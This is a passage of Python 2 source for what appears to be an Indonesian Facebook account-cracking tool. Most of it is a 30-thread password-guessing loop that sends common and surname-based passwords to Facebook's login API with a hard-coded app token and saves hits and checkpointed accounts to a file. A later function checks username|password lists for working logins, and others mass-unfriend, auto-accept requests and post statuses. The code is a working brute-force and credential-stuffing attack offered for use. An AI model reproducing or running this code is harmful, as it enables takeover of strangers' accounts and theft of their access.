                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;94m[\x1b[1;92mBerhasil\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass4
                            oks.append(user + pass4)
                        else:
                            if 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;94m[\x1b[1;93mCekpoint\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass4
                                cek = open('out/super_cp.txt', 'a')
                                cek.write(user + '|' + pass4 + '\n')
                                cek.close()
                                cekpoint.append(user + pass4)
                            else:
                                pass5 = 'Sayang'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;94m[\x1b[1;92mBerhasil\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass5
                                    oks.append(user + pass5)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;94m[\x1b[1;93mCekpoint\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass5
                                    cek = open('out/super_cp.txt', 'a')
                                    cek.write(user + '|' + pass5 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass5)
                                else:
                                    pass6 = 'Kontol'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;94m[\x1b[1;92mBerhasil\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass6
                                        oks.append(user + pass6)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;94m[\x1b[1;93mCekpoint\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass6
                                        cek = open('out/super_cp.txt', 'a')
                                        cek.write(user + '|' + pass6 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass6)
                                    else:
                                        pass7 = 'Anjing'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;94m[\x1b[1;92mBerhasil\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass7
                                            oks.append(user + pass7)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;94m[\x1b[1;93mCekpoint\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass7
                                            cek = open('out/super_cp.txt', 'a')
                                            cek.write(user + '|' + pass7 + '\n')
                                            cek.close()
                                            cekpoint.append(user + pass7)
                                        else:
                                            pass8 = b['last_name'] + '12345'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;94m[\x1b[1;92mBerhasil\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass8
                                oks.append(user + pass8)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;94m[\x1b[1;93mCekpoint\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass8
                                cek = open('out/super_cp.txt', 'a')
                                cek.write(user + '|' + pass8 + '\n')
                                cek.close()
                                cekpoint.append(user + pass8)
                            else:
                                pass9 = 'Katasandi'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;94m[\x1b[1;92mBerhasil\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass9
                                    oks.append(user + pass9)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;94m[\x1b[1;93mCekpoint\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass9
                                    cek = open('out/super_cp.txt', 'a')
                                    cek.write(user + '|' + pass9 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass9)
                                else:
                                    pass10 = 'Bajingan'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;94m[\x1b[1;92mBerhasil\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass10
                                        oks.append(user + pass10)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;94m[\x1b[1;93mCekpoint\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass10
                                        cek = open('out/super_cp.txt', 'a')
                                        cek.write(user + '|' + pass10 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass10)
                                    else:
                                        pass11 = 'Doraemon'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;94m[\x1b[1;92mBerhasil\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass11
                                            oks.append(user + pass11)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;94m[\x1b[1;93mCekpoint\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass11
                                            cek = open('out/super_cp.txt', 'a')
                                            cek.write(user + '|' + pass11 + '\n')
                                            cek.close()
                                            cekpoint.append(user + pass11)
                                        else:
                                            pass12 = 'Persija'
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;94m[\x1b[1;92mBerhasil\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass12
                                                oks.append(user + pass12)
                                            elif 'www.facebook.com' in q['error_msg']:
                                                print '\x1b[1;94m[\x1b[1;93mCekpoint\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass12
                                                cek = open('out/super_cp.txt', 'a')
                                                cek.write(user + '|' + pass12 + '\n')
                                                cek.close()
                                                cekpoint.append(user + pass12)
                                            else:
                                                a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                                                b = json.loads(a.text)
                                                pass13 = 'Persib'
                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                q = json.load(data)
                                                if 'access_token' in q:
                                                    print '\x1b[1;94m[\x1b[1;92mBerhasil\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass13
                                                    oks.append(user + pass13)
                                                elif 'www.facebook.com' in q['error_msg']:
                                                    print '\x1b[1;94m[\x1b[1;93mCekpoint\x1b[1;94m]\x1b[1;97m ' + user + ' \x1b[1;94m|\x1b[1;97m ' + pass13
                                                    cek = open('out/super_cp.txt', 'a')
                                                    cek.write(user + '|' + pass13 + '\n')
                                                    cek.close()
                                                    cekpoint.append(user + pass13)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 44 * '\x1b[1;94m\xe2\x95\x90'
    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mDone \x1b[1;97m....'
    print '\x1b[1;91m[+] \x1b[1;92mTotal OK/CP \x1b[1;91m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;91m[+] \x1b[1;92mCP File saved \x1b[1;91m: \x1b[1;97mout/super_cp.txt'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    super()


def accept():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
    r = requests.get('https://graph.facebook.com/me/friendrequests?limit=' + limit + '&access_token=' + toket)
    teman = json.loads(r.text)
    if '[]' in str(teman['data']):
        print '\x1b[1;91m[!] No friend request'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu()
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
    print 44 * '\x1b[1;94m\xe2\x95\x90'
    for i in teman['data']:
        gas = requests.post('https://graph.facebook.com/me/friends/' + i['from']['id'] + '?access_token=' + toket)
        a = json.loads(gas.text)
        if 'error' in str(a):
            print '\x1b[1;94m[ \x1b[1;91mFailed\x1b[1;94m ]\x1b[1;97m ' + i['from']['name']
        else:
            print '\x1b[1;94m[ \x1b[1;92mAccept\x1b[1;94m ]\x1b[1;97m ' + i['from']['name']

    print 44 * '\x1b[1;94m\xe2\x95\x90'
    print '\x1b[1;91m[+] \x1b[1;92mDone'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu()


def unfriend():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
    print 44 * '\x1b[1;94m\xe2\x95\x90'
    try:
        pek = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        cok = json.loads(pek.text)
        for i in cok['data']:
            nama = i['name']
            id = i['id']
            requests.delete('https://graph.facebook.com/me/friends?uid=' + id + '&access_token=' + toket)
            print '\x1b[1;94m[\x1b[1;92m Deleted \x1b[1;94m]\x1b[1;97m ' + nama

    except IndexError:
        pass
    except KeyboardInterrupt:
        print '\x1b[1;91m[!] Stopped'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu()

    print '\n\x1b[1;91m[+] \x1b[1;92mDone'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu()


def status():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    msg = raw_input('\x1b[1;91m[+] \x1b[1;92mType status \x1b[1;91m:\x1b[1;97m ')
    if msg == '':
        print "\x1b[1;91m[!] Don't be empty"
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu()
    else:
        res = requests.get('https://graph.facebook.com/me/feed?method=POST&message=' + msg + '&access_token=' + toket)
        op = json.loads(res.text)
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mCreate \x1b[1;97m...')
        print 44 * '\x1b[1;94m\xe2\x95\x90'
        print '\x1b[1;91m[+] \x1b[1;92mStatus ID\x1b[1;91m : \x1b[1;97m' + op['id']
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu()


def guard():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;94m[\x1b[1;92m1\x1b[1;94m]\x1b[1;97m Activate'
    print '\x1b[1;94m[\x1b[1;92m2\x1b[1;94m]\x1b[1;97m Not Activate'
    print '\x1b[1;94m[\x1b[1;91m0\x1b[1;94m]\x1b[1;91m Back'
    pilih_guard()


def pilih_guard():
    g = raw_input('\n\x1b[1;94m >>> \x1b[1;97m')
    if g == '1':
        aktif = 'true'
        gaz(toket, aktif)
    elif g == '2':
        non = 'false'
        gaz(toket, non)
    elif g == '0':
        menu()
    elif g == '':
        keluar()
    else:
        keluar()


def get_userid(toket):
    url = 'https://graph.facebook.com/me?access_token=%s' % toket
    res = requests.get(url)
    uid = json.loads(res.text)
    return uid['id']


def gaz(toket, enable=True):
    id = get_userid(toket)
    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth %s' % toket}
    url = 'https://graph.facebook.com/graphql'
    res = requests.post(url, data=data, headers=headers)
    print res.text
    if '"is_shielded":true' in res.text:
        os.system('clear')
        print logo
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mActivate'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu()
    elif '"is_shielded":false' in res.text:
        os.system('clear')
        print logo
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;91mNot activate'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu()
    else:
        print '\x1b[1;91m[!] Error'
        keluar()


def check_akun():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;91m[?] \x1b[1;92mCreate in file\x1b[1;91m : \x1b[1;97musername|password'
    print 44 * '\x1b[1;94m\xe2\x95\x90'
    live = []
    cek = []
    die = []
    try:
        file = raw_input('\x1b[1;91m[+] \x1b[1;92mFile path \x1b[1;91m:\x1b[1;97m ')
        list = open(file, 'r').readlines()
    except IOError:
        print '\x1b[1;91m[!] File not found'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu()

    pemisah = raw_input('\x1b[1;91m[+] \x1b[1;92mSeparator \x1b[1;91m:\x1b[1;97m ')
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
    print 44 * '\x1b[1;94m\xe2\x95\x90'
    for meki in list:
        username, password = meki.strip().split(str(pemisah))
        url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + password + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
        data = requests.get(url)
        mpsh = json.loads(data.text)
        if 'access_token' in mpsh:
            live.append(password)
            print '\x1b[1;94m[ \x1b[1;92mLive\x1b[1;94m ] \x1b[1;97m' + username + '\x1b[1;94m|\x1b[1;97m' + password
        elif 'www.facebook.com' in mpsh['error_msg']:
            cek.append(password)
            print '\x1b[1;94m[ \x1b[1;93mCheck\x1b[1;94m ] \x1b[1;97m' + username + '\x1b[1;94m|\x1b[1;97m' + password
        else:
            die.append(password)
            print '\x1b[1;94m[ \x1b[1;91mDie\x1b[1;94m ] \x1b[1;97m' + username + '\x1b[1;94m|\x1b[1;97m' + password

    print 44 * '\x1b[1;94m\xe2\x95\x90'
    print '\x1b[1;91m[+] \x1b[1;92mTotal\x1b[1;91m : \x1b[1;97mLive=\x1b[1;92m' + str(len(live)) + ' \x1b[1;97mCheck=\x1b[1;93m' + str(len(cek)) + ' \x1b[1;97mDie=\x1b[1;91m' + str(len(die))
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu()


if __name__ == '__main__':
    login()
